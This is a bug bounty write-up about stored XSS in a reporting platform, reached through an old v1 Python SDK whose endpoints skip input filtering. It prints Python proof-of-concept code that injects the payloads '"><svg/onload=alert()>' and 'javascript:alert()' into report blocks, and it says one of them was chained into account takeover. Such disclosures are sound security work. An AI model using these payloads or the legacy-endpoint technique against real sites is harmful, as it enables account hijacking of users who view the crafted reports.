---
title: "Legacy SDK Flaws Cause Stored XSS and Account Takeover"
date: "2025-03-14"
excerpt: "A casual day of hunting bugs turned into a serious jackpot thanks to some forgotten open source library. This vulnerability allowed for complete account takeover through stored XSS."
tags: ["XSS", "Account Takeover", "SDK", "Bug Bounty"]
author: "MindPatch"
---
  
![](https://miro.medium.com/v2/resize:fit:480/0*wFXpWUgkd4CNm-ov.gif)

—

Alright, let me tell you a fun story about how a casual day of hunting bugs turned into a serious jackpot — all thanks to some forgotten open source library!

It started like any other day: coffee ready, Burp Suite fired up, and enthusiasm maxed out. I was testing a cool AI-driven reporting/training platform over at example.ai.

These folks were pretty solid when it came to securing their main endpoints; my usual payloads and tests didn’t reveal much initially. However, the moment I stumbled onto their  `/reports`  page, my curiosity went through the roof. This page was super interactive—it allowed users to create detailed, professional-looking reports with graphs, charts, images, markdown support, etc ..

I tried finding any bugs on this feature but didn’t ended well unfortunately

But after searching around their github organization repos I found a library called  `utils_libs` and its README.md says that let you create report using python in automated way

and I revealed two versions of their report library:  `utils.report.v1`  and  `utils_libs.report.v2`. Considering organizations often neglect older SDK versions during updates, I wondered whether the older  `v1`  endpoint might still be active

Curiosity piqued, I quickly whipped up a test script using the old, seemingly abandoned  `v1`  API:

```python
import utils_libs  
import utils_libs.reports.v1 as ul

# Setup credentials  
entity = "<REPLACE>"  
project = "<REPLACE>"# Creating a sneaky report  
report = ul.Report(  
    entity=entity,  
    project=project,  
    title="XSS HERE BE AWARE",  
    description="Never gonna give you up, never gonna let you down"  
)# Injecting our little surprise  
report.save()
```

after running the script I got the report created on the UI successfully.

I add burpsuite in the mid of the library requests to track it down and I noticed it calls  **different endpoints**!

![](https://miro.medium.com/v2/resize:fit:320/0*A4q6356PxRgZBIKH.gif)

When using this endpoint, there is no XSS (Cross-Site Scripting) filter applied to functions that are intended to add links for the report writer. Below is an example of how this vulnerability can be exploited:

```python
import utils_libs  
import utils_libs.reports.v1 as ul

# Initialize the utils_libs API  
api = utils_libs.Api()# Define the entity and project  
entity = "<REPLACE>"  # Replace with your utils_libs entity  
project = "<REPLACE>"  # Replace with your utils_libs project# Create a new report  
report = ul.Report(  
    entity=entity,  
    project=project,  
    title="XSS HERE - BE AWARE",  
    description="Never gonna give you up, never gonna let you down"  
)# Add a block with an XSS payload  
report.blocks = [ul.Twitter('"><svg/onload=alert()>')]# Save the report  
report.save()
```

This code successfully stored an XSS payload, which can be accessed via the URL  `example.ai/reports/<reportid>`. Notably, this report can be viewed by anyone, even if they are not part of my organization

![](https://miro.medium.com/v2/resize:fit:480/0*XxPwaT6DwUAgyTLX.gif)

# But wait, there’s more!

After the excitement of the first payout wore off, I thought, “why not dig a bit deeper?”

Revisiting their repository, I found another interesting feature — embedding videos into reports. Now, embedding videos seemed innocent enough, but experience taught me never to underestimate innocent-looking functionalities.

So, I gave it a try:

```python
report = ul.Report(  
    entity=entity,  
    project=project,  
    title="Another Sneaky XSS",  
    description="Keep calm and hack responsibly"  
)  
report.pages = [ul.Video('javascript:alert()')]  
report.save()
```

And bingo! Another stored XSS! But this wasn’t just any simple vulnerability — this time, it was even more impactful.

By chaining this XSS with another minor misconfiguration, I escalated it to  **full account takeover**.

That meant I could completely control someone’s account just by tricking them into viewing my crafted report.

![](https://miro.medium.com/v2/resize:fit:700/1*k2U5b8qynuKX3XRR7LOQOQ.png)

The team this time higher the impact and higher the bounty which is a good win

![](https://miro.medium.com/v2/resize:fit:480/0*9HkGy1bjg5R6HlE9.gif)

## Side Hint:

Always dig deeper into seemingly unrelated or forgotten resources. Old API docs, outdated Python SDKs, archived repositories, or forgotten JavaScript files might contain hidden parameters or endpoints. These endpoints often bypass filters or security checks because they aren’t actively maintained, potentially leading to undiscovered vulnerabilities.

And that’s it

Bye ..

![](https://miro.medium.com/v2/resize:fit:379/0*-Pc5vZ1KCEfJFa0o.gif)
